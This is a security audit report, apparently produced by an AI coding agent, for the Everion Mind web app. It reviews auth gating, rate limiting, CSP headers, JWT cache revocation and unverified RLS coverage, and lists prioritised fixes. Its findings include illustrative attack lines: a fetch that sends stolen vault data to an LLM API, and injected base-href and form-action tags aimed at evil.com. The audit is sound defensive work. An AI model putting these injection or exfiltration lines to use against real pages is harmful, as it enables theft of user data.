# Security Audit — 2026-05-07

> Cross-cutting security review of Everion Mind: auth gating, RLS, response headers, CSP, secret handling, input validation, rate-limit/auth integration, crypto basics, supply-chain. Excludes per-pipeline auth (`auth-flow-audit`), vault crypto detail (`vault-unlock-audit`), service-role usage shape (`service-role-usage-audit`), and dependency upgrade plan (deferred). Where those overlap, this audit references them and stops at the seam.

## Verdict

Defence-in-depth holds. Every prod entrypoint passes through `withAuth`/`withApiKey`, the wrapper enforces method → rate-limit → JWT verify → handler in fixed order, and rate-limiting fails closed when Upstash is missing or the breaker trips. Response headers are dense — strict CSP (no `unsafe-inline` script, no wildcards in connect-src), HSTS preload, Frame-DENY, COOP/CORP, opinionated Permissions-Policy. `npm audit --omit=dev` returns zero vulnerabilities across 363 prod deps. No `eval`, no `new Function`, no `dangerouslySetInnerHTML`, no `postinstall` hook. Service role key never crosses to the browser — `src/` reads only `import.meta.env.VITE_*` config, no secrets.

But several gaps deserve hard fixes before launch: CSP allows two unrelated LLM CDNs that the server side never calls (`api.anthropic.com`, `api.openai.com`) — surface for exfil if XSS were to land. The `verifyAuth` cache lives 5s past a token revocation. CSP lacks `frame-ancestors` and `base-uri`. The `withAuth` per-IP rate limit collides on shared egress (corporate NAT, mobile carriers) — auth-route DoS risk. RLS coverage **could not be confirmed** in this pass — Supabase MCP requires OAuth and was not authenticated.

**Bottom line: ship-ready posture, 1 HIGH (CSP exfil surface) + 4 MEDIUM + 3 LOW. No criticals. Fix HIGH before launch, MEDIUMs in week-1 hardening.**

---

## Architecture overview

```
Browser  ─► CSP/HSTS/Frame-DENY (vercel.json /(.*) headers)
        ─► Vercel Edge ─► api/*.ts (12 functions)
                              │
                              ▼
                       withAuth / withApiKey
                       1. applySecurityHeaders
                       2. method check (405)
                       3. rateLimit (Upstash, fail-closed)
                       4. verifyAuth (Supabase /auth/v1/user, 5s TTL)
                       5. handler({ req, res, user, log })
                              │
                              ▼
                       sbHeaders() — service-role key
                              │
                              ▼
                  Supabase (RLS on user-data tables;
                  service-role bypasses → handlers do
                  per-user filters in WHERE clauses)

Webhooks (LS, RC) bypass withAuth — own signature/bearer paths
Cron       (/api/cron/*) bypasses withAuth — verifyCronBearer
OAuth init (/gmail-auth, /calendar-auth) — verifyAuth direct
MCP        (/api/mcp) — resolveMcpBearer (em_* or mcp_* HMAC)
```

---

## What's solid

- **Every prod entrypoint auth-gated.** Glob of `api/*.ts` shows `withAuth(` or `withApiKey(` on `feedback.ts:31`, `capture.ts:36`, `entries.ts:73`, `llm.ts:1083`, `search.ts:41`, `transfer.ts:27`, `v1.ts:349`, plus 27 sub-handlers in `user-data.ts`. The non-wrapper paths (LS webhook, RC webhook, cron, OAuth init, MCP) each have their own verified gate — no naked-route surface.
- **Wrapper ordering is correct.** `api/_lib/withAuth.ts:128-151`: security headers → method → rate-limit → auth → handler. Rate-limit runs **before** JWT verify, so unauth flood can't burn the auth round-trip; auth ApiError → 401 happens before any handler code runs.
- **Rate-limiter fails closed.** `api/_lib/rateLimit.ts:163-175`: missing Upstash on Vercel returns `false` (deny). Circuit breaker opens after 3 consecutive failures (`_CIRCUIT_THRESHOLD = 3`, `_CIRCUIT_OPEN_MS = 5*60_000`), keeps rejecting for 5 min before re-probing. Per-instance in-memory fallback is **only** used in dev (`!_onVercel`).
- **Distinct rate-limit keys per route.** `rateLimit.ts:159-162`: `${ip}:${path}:${suffix}`. `withApiKey` further suffixes with `api-key:${userId}:${keyId}` (`withAuth.ts:236-242`) — one user's key burning their bucket can't 429 a different user.
- **Pre-auth flood guard on api-key auth.** `withAuth.ts:222`: `preAuthLimit = Math.max(limit*5, 60)` per IP before resolveApiKey runs — caps Supabase lookups from a flood of fake `Bearer em_*` headers.
- **Response headers, OWASP Secure-Headers tier-A.** `vercel.json:75-110`: HSTS `max-age=31536000; includeSubDomains; preload` (preload-list eligible), `X-Content-Type-Options nosniff`, `X-Frame-Options DENY`, `Referrer-Policy strict-origin-when-cross-origin`, COOP `same-origin-allow-popups`, CORP `same-origin`, opinionated Permissions-Policy disabling FLoC/Topics/payment/geolocation/sensors. `/api/*` adds `Cache-Control: no-store` + `X-Robots-Tag: noindex`.
- **Strict CSP — no `unsafe-inline` for scripts.** `vercel.json:81`: `script-src 'self' https://*.i.posthog.com https://*.posthog.com https://va.vercel-scripts.com` — analytics only. `default-src 'self'`. `connect-src` is allowlisted. `worker-src 'self' blob:`. `style-src` keeps `unsafe-inline` (necessary for inline `style=` from utility-first CSS).
- **Service role key never reaches the browser.** Grep `process.env.` in `src/` returns zero hits — only `import.meta.env.VITE_*` (publishable: Supabase URL, anon key, Sentry DSN, PostHog key, RevenueCat public SDK keys, feature flags). Service role is centralised in `api/_lib/sbHeaders.ts:6-8`.
- **No `eval`, no `new Function`, no `dangerouslySetInnerHTML`.** Grep across `src/` and `api/` returns zero. React's default escaping is the only XSS sink in play.
- **No `postinstall`/`preinstall` script.** `package.json` has only `prepare: "husky"` — runs locally, no network fetch, no install-time code execution from a transitive supply chain.
- **`npm audit --omit=dev` clean.** 363 prod deps, zero info/low/moderate/high/critical — full result `{"vulnerabilities":{}}`.
- **JWT cache bounded.** `verifyAuth.ts:9-23`: `CACHE_MAX_ENTRIES = 500` with FIFO eviction — Map insertion order trimmed when full. Stops a hot instance from unbounded growth.
- **JWT verify has timeout.** `verifyAuth.ts:7,47-48`: `VERIFY_TIMEOUT_MS = 5_000` via AbortController — Supabase `/auth/v1/user` 504s don't hold a 300s function. On non-2xx the cache entry is dropped (`verifyAuth.ts:59`), so a revoked token won't replay from cache after one rejection.
- **API key resolution is hash-only.** `api/_lib/resolveApiKey.ts:9-14`: `em_` prefix gate, then SHA-256 against `user_api_keys.key_hash`, then `revoked_at IS NULL` filter — raw key never compared in plaintext.
- **MCP token signed with rotating fallback chain.** `api/mcp.ts:40-42`: `MCP_ACCESS_TOKEN_SECRET ?? OAUTH_STATE_SECRET ?? supabaseServiceRoleKey()`. `verifyMcpAccessToken` uses `timingSafeEqual` with length-precheck (`mcp.ts:69-71`).
- **Cron auth uses constant-time compare.** `api/_lib/cronAuth.ts:13-23`: `verifyCronBearer` — Buffer compare with length precheck → `crypto.timingSafeEqual`. `handleCronDaily`/`handleCronHourly` both gate at line `user-data.ts:2306` and `:2662`.
- **Body size capped at the entrypoint.** `user-data.ts:40,49-67`: `MAX_RAW_BODY_BYTES = 2*1024*1024` enforced in `bufferBody`, throws `BodyTooLargeError` → 413. Webhook signature paths get the raw buffer, not a parsed object. `v1.ts:15`: `bodyParser: { sizeLimit: "1mb" }` for the public API.
- **Idempotency-key validation.** `api/_lib/idempotency.ts:26-37`: 200-char cap, ASCII printable only (`/^[\x20-\x7e]+$/`). No injection through the key.
- **Webhook event dedup.** `api/_lib/webhookIdempotency.ts`: SET NX with 24h TTL on Upstash, namespaced `lemon:event:*` / `revenuecat:event:*`. Replay attacks within 24h drop on second-time-seen.
- **Brain-access role enforcement.** `withAuth.ts:172-183`: `requireBrainRole` validates `brainId` shape (`length <= 100`), checks DB-backed access, allowlist of roles. Used by every brain-scoped handler.
- **Admin gate is a clean predicate.** `api/_lib/adminAuth.ts:3-5`: `app_metadata.is_admin === true`. `app_metadata` is service-role only — user can't set it. 7 callsites in `entries.ts` (936-1304) all throw `ApiError(403)` before any side-effect.
- **Last-hop IP for rate limiting.** `rateLimit.ts:120-131`: comment-S1-6 — uses `x-forwarded-for.split(',').pop().trim()`. Vercel's edge appends the verified hop last, so spoofed XFF prefixes can't shift counters to a different bucket.

---

## Findings

### F1 — CSP `connect-src` allowlists LLM endpoints the server alone uses

**Severity: HIGH**

`vercel.json:81`:

```
connect-src 'self' https://*.supabase.co wss://*.supabase.co
            https://api.anthropic.com https://api.openai.com
            https://openrouter.ai https://api.groq.com
            https://api.resend.com https://generativelanguage.googleapis.com
            https://*.i.posthog.com https://*.posthog.com
            https://vitals.vercel-insights.com https://va.vercel-scripts.com
```

The browser never calls `api.anthropic.com`, `api.openai.com`, `openrouter.ai`, `api.groq.com`, `api.resend.com`, or `generativelanguage.googleapis.com` directly. Every LLM hop runs server-side through `api/llm.ts`, `api/v1.ts::callOpenAI` (`v1.ts:60-83`), `api/_lib/googleAi.ts`, etc. The browser-side AI surface is `fetch('/api/llm', …)` — same-origin.

**Why it matters**: CSP is the second line after no-XSS. If an XSS or HTML-injection bug lands (a third-party script swap, a Markdown-render path that bypasses React's escaping, a future feature regression), `connect-src` is what stops the attacker exfiltrating user data. The current allowlist permits `fetch('https://api.openai.com/v1/chat/completions', { body: <stolen vault contents> })` — Anthropic/OpenAI/Groq/OpenRouter all accept arbitrary `Bearer` tokens. The attacker provides their own key; they don't need yours.

The carve-outs that **do** belong: Supabase (browser SDK calls), PostHog (`*.i.posthog.com`), Vercel Insights, RevenueCat (capacitor — not in connect-src list, native).

**Mitigations in place**:
- Strict `script-src 'self'` blocks the typical injection vector.
- HSTS + Frame-DENY closes the iframe escape.
- React's default escaping covers user-rendered strings.

**Fix shape**: drop the LLM domains and `api.resend.com` from `connect-src`. Final list:

```
connect-src 'self' https://*.supabase.co wss://*.supabase.co
            https://*.i.posthog.com https://*.posthog.com
            https://vitals.vercel-insights.com https://va.vercel-scripts.com;
```

If a future browser-side direct call is genuinely needed (e.g. streaming Anthropic responses without the server proxying), gate it behind a per-feature allowlist, not the global one. Test before shipping — `import.meta.env.DEV` paths sometimes hit dev tools that need extra origins.

### F2 — JWT cache TTL means revoked tokens keep working for up to 5s

**Severity: MEDIUM**

`api/_lib/verifyAuth.ts:8`: `CACHE_TTL_MS = 5_000`. After a successful Supabase `/auth/v1/user` lookup, the user record is keyed by SHA-256(token) and replayed for the next 5s without re-checking with Supabase.

**Failure mode**: user clicks "Sign out everywhere" or admin revokes a session. Server-side `getUser` would now reject the JWT. But for up to 5s any in-flight or new request from the same JWT still sees the cached user record and serves data.

**Why it's hard to remove**: the cache exists for a real reason — a single page render fan-outs ~8 authed requests in parallel and the un-cached path was paying 8 × ~100ms (`verifyAuth.ts:11-22` comment). Setting TTL = 0 reverts to that.

**Quantitative cost of the cache**: read failures are not retried — `verifyAuth.ts:57-60` deletes the entry on any non-2xx. So this is purely a "valid-token-now-revoked" gap, not a forge gap.

**Fix shape**:
- Drop TTL to **2s** — still collapses the page-load burst (those 8 fan-outs land in <500ms), shrinks the revocation window by 60%.
- For high-stakes mutating endpoints (`handleDeleteAccount`, `handleAdminSetTier`, `handleApiKeys` revocation), bypass the cache and force-verify. One extra round-trip on the rare path; revocation is honoured immediately.
- Document the residual 2s window in `EML/Ops/incident-response.md` so the runbook for "session compromise" knows to tell the user to also rotate their password (which Supabase's `users.invalidate_jwt` does not currently force).

### F3 — Per-IP rate limit collides on NAT/CGNAT egress

**Severity: MEDIUM**

`api/_lib/rateLimit.ts:159-161`: `key = ${ip}:${path}` (or `${ip}:${path}:${suffix}` for api-key auth). The IP is whatever the last verified XFF hop is — for users behind a corporate NAT, mobile carrier CGNAT, or a shared university network, that's one IP for everyone.

**Effect**: 30-req/min default budget on `withAuth` (line 85: `opts.rateLimit ?? 30`). One person opening Settings burns ~6 reqs (profile, brains, prefs, brain-vault-grants, api_keys, status). Five colleagues on the same office Wi-Fi ≈ 30 → all 6th and onwards 429.

The fix that already shipped for `withApiKey` (suffix by `userId:keyId`, `withAuth.ts:236-242`) needs to extend to `withAuth`. Right now `withAuth` only suffixes by route — fine for distinguishing actions, useless for distinguishing users.

**Fix shape**: post-auth, key the limiter by `${userId}:${path}:${suffix}` instead of `${ip}:${path}:${suffix}`. Move the `rateLimit` call from line 137 (pre-auth) to **after** `verifyAuth` succeeds, OR keep a small pre-auth IP cap (e.g. 100/min) for flood protection but the real per-action budget runs against the user id. Mirrors the `withApiKey` two-tier pattern.

### F4 — CSP missing `frame-ancestors` and `base-uri`

**Severity: MEDIUM**

`vercel.json:81` lacks `frame-ancestors 'none'` and `base-uri 'self'`.

- `X-Frame-Options: DENY` is present (line 84) — protects on browsers that honour it. **But** the spec preference now is CSP `frame-ancestors` (XFO is informally deprecated, ignored when CSP3 directives present in some browsers per WHATWG drift). Both should be set.
- Missing `base-uri` lets an HTML-injection attacker insert `<base href="https://evil.com/">` and redirect every relative URL on the page (script src, image src, link href). With current CSP `script-src 'self'` this *should* still block, but `base-uri` is the belt-and-braces.
- Missing `form-action` lets injected `<form action="https://evil.com">` post anywhere.
- Missing `object-src 'none'` — modern Chrome defaults to it but Firefox/Safari respect explicit value.

**Fix shape**: append to the CSP value:

```
frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'
```

Cost: zero — these are tightenings, not loosenings. Test in staging because some auth flows (Stripe Checkout, billing portal) post forms to third-party origins; if so, allowlist those specific origins in `form-action`.

### F5 — RLS coverage not verified in this pass

**Severity: MEDIUM** (verification gap, not a confirmed defect)

The audit brief asks for `pg_tables` + `pg_policies` checks via Supabase MCP. The MCP tool surface here is `mcp__plugin_supabase_supabase__authenticate` — OAuth flow, not pre-authenticated. No tool was available in this session to run `select * from pg_policies` or `mcp__claude_ai_Supabase__get_advisors`.

**What we *can* infer from code**: every server-side query uses `sbHeaders()` which is the **service role key** (`api/_lib/sbHeaders.ts:11-15`). Service role bypasses RLS. Every handler therefore must filter by `user_id = ${user.id}` in its own WHERE clause for safety — RLS is not the line of defence on the API path, the WHERE clause is. The browser SDK (`src/lib/supabase.ts`) uses the anon key — for that path RLS is the line of defence.

**Mitigation in place**: the pattern is consistent in handlers I read (`handleProfile` filters `user_id=eq.${user.id}`, `handleApiKeys`, `handleVault` etc.). But the audit can't say "every public table has RLS enabled" without `pg_tables.rowsecurity` evidence.

**Fix shape**: re-run this section once Supabase MCP is authenticated, OR pull the latest `decisions.md` migration log to confirm migration 057 (audit_log) and earlier migrations enable RLS on every public table. `EML/Ops/disaster-recovery.md` should reference an "RLS coverage SQL self-check" snippet to keep this verifiable.

### F6 — `handleAuth` falls through to redirect after error without error handling

**Severity: LOW**

`api/gmail.ts:184-188`:

```ts
if (req.method === "GET") {
  return res.status(405).json({ error: "Use POST with Authorization header to start OAuth" });
}
```

Reachable only when `req.method === "GET"` AND no `code` query param — i.e. someone visiting `/api/gmail-auth?provider=google` directly. Returns 405 cleanly. Fine.

But the `callbackGoogle` path at `gmail.ts:144-156` writes `tokens.access_token` and `tokens.refresh_token` to Supabase on success, then `res.redirect(302, …)`. If the **DB write fails** (line 156), it redirects with `?gmailError=db_write_failed`. **No** retry, no token revocation — the user just retried OAuth; access_token + refresh_token now exist at Google, encrypted and cached in their browser-side Google session, but our DB has no record. If the user grants consent and re-authorizes, the previous token grant lingers at Google with no way for the user to revoke it from our app (we don't know the token). Best-effort fix: on `dbRes.ok === false`, call `https://oauth2.googleapis.com/revoke?token=...` before redirecting.

**Severity: LOW** because the failure mode is a one-off Supabase outage during OAuth, not an attacker path. But "stale tokens at Google" is mildly user-hostile.

### F7 — `connect-src` missing `'strict-dynamic'` on `script-src`, low CSP score

**Severity: LOW**

CSP is solid (no `unsafe-eval`, no `unsafe-inline` script) but doesn't use `'strict-dynamic'`. Modern best practice — once you've allowlisted scripts by origin, `'strict-dynamic'` lets those scripts load further scripts via cryptographic identity rather than fixed origins. Less foot-gun if a new analytics dependency lands and forgets to update the policy.

**Mitigation in place**: current allowlist (`'self'`, posthog, vercel-scripts) is small and stable. PostHog is the only third-party.

**Fix shape**: defer until a CSP nonce/hash pipeline is set up (Vite + Vercel doesn't natively emit per-render nonces — needs middleware). Not a launch blocker.

### F8 — Static `Authorization` header in CSP for posthog `*.posthog.com`

**Severity: LOW**

`vercel.json:81`: `connect-src` allows `https://*.posthog.com`. PostHog's wildcard subdomain (`eu.i.posthog.com`, `app.posthog.com`, etc.) is fine in practice — these are PostHog-controlled. **But** the `*` covers any subdomain PostHog ever creates, including future ones an attacker could potentially hijack via subdomain takeover (low base-rate but non-zero — PostHog's `*` previously had a takeover incident on a sibling). Pin the exact host.

**Mitigation in place**: PostHog is a reputable vendor; subdomain-takeover monitoring on their side is presumed.

**Fix shape**: replace `*.posthog.com` with the exact origin posthog-js uses. Check `src/lib/posthog.ts:27` — `VITE_POSTHOG_HOST ?? "https://eu.i.posthog.com"`. Allowlist that host. Drop the wildcard.

---

## Surface map

| Path | Auth gate | Rate limit | Body cap | Headers | Notes |
|---|---|---|---|---|---|
| `/api/feedback` | `withAuth` | 30/min | wrapper | applied | clean |
| `/api/capture` | `withAuth` | per-action | wrapper | applied | clean |
| `/api/entries` | `withAuth` | per-action | wrapper | applied | admin sub-handlers gated by `isAdminUser` |
| `/api/llm` | `withAuth` | per-model | wrapper | applied | server-side LLM proxy — keys never to browser |
| `/api/search` | `withAuth` | per-action | wrapper | applied | clean |
| `/api/transfer` | `withAuth` | 5/min export | wrapper | applied | export is heavy |
| `/api/v1/*` | `withApiKey` | 30/min + per-key | 1MB | applied | public API surface |
| `/api/mcp` | `resolveMcpBearer` (em_*/mcp_*) | direct call | direct | applied | OAuth + token paths |
| `/api/calendar` | `withAuth` + OAuth init | varies | wrapper | applied | direct verifyAuth on init |
| `/api/gmail` | `withAuth` + OAuth init | varies | wrapper | applied | direct verifyAuth on init |
| `/api/memory-api` | `withAuth` | wrapper | wrapper | applied | clean |
| `/api/user-data` | dispatch → 27 sub-handlers | each gated | 2MB raw | applied | webhooks bypass `withAuth`, use signature/bearer |
| `/api/cron/daily` | `verifyCronBearer` | n/a | n/a | applied | constant-time bearer compare |
| `/api/cron/hourly` | `verifyCronBearer` | n/a | n/a | applied | constant-time bearer compare |
| `/api/lemon-webhook` | LS HMAC sig | n/a | raw 2MB | applied | covered by billing audit |
| `/api/revenuecat-webhook` | RC bearer + Upstash dedup | n/a | raw 2MB | applied | covered by billing audit |

---

## Limitations

- **Supabase MCP unauthenticated.** `mcp__plugin_supabase_supabase__authenticate` is the only Supabase tool surfaced in this session — OAuth flow, not pre-authed. Three planned signals could not run:
  - `pg_tables.rowsecurity = false` enumeration (RLS-disabled public tables)
  - `pg_policies` policy-clause sample (USING/WITH CHECK scope check)
  - `mcp__claude_ai_Supabase__get_advisors type:'security'`

  See F5. The fix is to authenticate the MCP and re-run the section against `wfvoqpdfzkqnenzjxhui`.

- **Did not exercise live request paths.** No real Vercel deployment was hit. The audit relies on code reading. CSP is verified against `vercel.json` not against a live response header.

- **Knip / dead-code analysis not run.** Out of scope (covered by `code-hygiene` audit).

---

## Recommendations (priority)

1. **[HIGH] F1** — strip LLM CDNs from CSP `connect-src`. Browser never calls them; they're an XSS exfil surface. ~2 min `vercel.json` edit. Test in staging once.
2. **[MEDIUM] F4** — add `frame-ancestors 'none'`, `base-uri 'self'`, `form-action 'self'`, `object-src 'none'` to CSP. Pure tightening. ~5 min.
3. **[MEDIUM] F2** — drop `verifyAuth` cache TTL to 2s (60% reduction in revocation gap). Force-verify on `handleDeleteAccount`, `handleAdminSetTier`, API key revocation. ~15 min.
4. **[MEDIUM] F3** — re-key `withAuth` rate-limiter by `userId` post-auth instead of (or in addition to) IP. NAT/CGNAT collision is a launch-day complaint magnet. ~30 min — mirror `withApiKey`'s two-tier pattern.
5. **[MEDIUM] F5** — authenticate Supabase MCP, run `pg_tables.rowsecurity` + `pg_policies` + `get_advisors`, archive the result. Closes the verification gap. ~10 min once MCP is authed.
6. **[LOW] F8** — replace `*.posthog.com` wildcard with exact `eu.i.posthog.com` (or whatever `VITE_POSTHOG_HOST` resolves to in prod). ~1 min.
7. **[LOW] F6** — on Gmail OAuth callback DB-write failure, call Google `revoke?token=` before redirecting. ~10 min, eliminates orphaned grants.
8. **[LOW] F7** — defer `'strict-dynamic'` migration until a Vite/Vercel CSP-nonce middleware is in place. Track in `EML/LAUNCH_CHECKLIST.md` as a P3 hardening task.

---

## Method

- Read `vercel.json` end-to-end. Validated CSP against OWASP Secure Headers Project recommendations and the WHATWG CSP3 spec.
- Read `api/_lib/withAuth.ts`, `verifyAuth.ts`, `rateLimit.ts`, `securityHeaders.ts`, `cronAuth.ts`, `resolveApiKey.ts`, `idempotency.ts`, `webhookIdempotency.ts`, `sbHeaders.ts`, `adminAuth.ts`.
- Glob `api/*.ts` (12 files), grep `withAuth(` / `withApiKey(` to confirm every route is gated. 100% coverage on the wrappers; webhook + cron + OAuth init paths verified individually.
- Grep `process.env.` across `api/` and `src/`. `src/` returned only `import.meta.env.VITE_*` (publishable config). No secret leaks.
- Grep `dangerouslySetInnerHTML`, `eval(`, `new Function(` across `api/` and `src/`. Zero hits.
- `npm audit --omit=dev --json` → 0 vulnerabilities, 363 prod deps.
- `npm ls --omit=dev --depth=0` — no surprising direct deps; React 19, Capacitor 8, Supabase 2.x, Sentry 10, web-push, posthog-js. Two extraneous wasm utility deps (`@napi-rs/wasm-runtime`, `@tybys/wasm-util`) — listed as extraneous, not in `package.json` — likely transitive leftovers from a previous `npm install`. Not security-relevant; clean up with `npm prune` post-launch.
- Read `package.json` `scripts` block. No `postinstall` / `preinstall`. `prepare: "husky"` runs git-hook installer locally only.
- Read `api/user-data.ts` lines 1-160 + cron handlers + webhook bypass routing.
- Read `api/v1.ts` lines 1-100 (public API surface).
- Read `api/mcp.ts` lines 1-100 (MCP token signing/verifying).
- Read `api/gmail.ts` lines 1-240 (OAuth flow + authed handler).
- Cross-checked overlap with `archive/billing-audit-2026-05-07.md`, referenced auth-flow-audit, vault-unlock-audit, service-role-usage-audit per scope brief.
- Could not authenticate Supabase MCP in this session — RLS verification deferred. See Limitations.

**Audit kicked off by**: user request "do all those highest-leverage audits" on 2026-05-07.
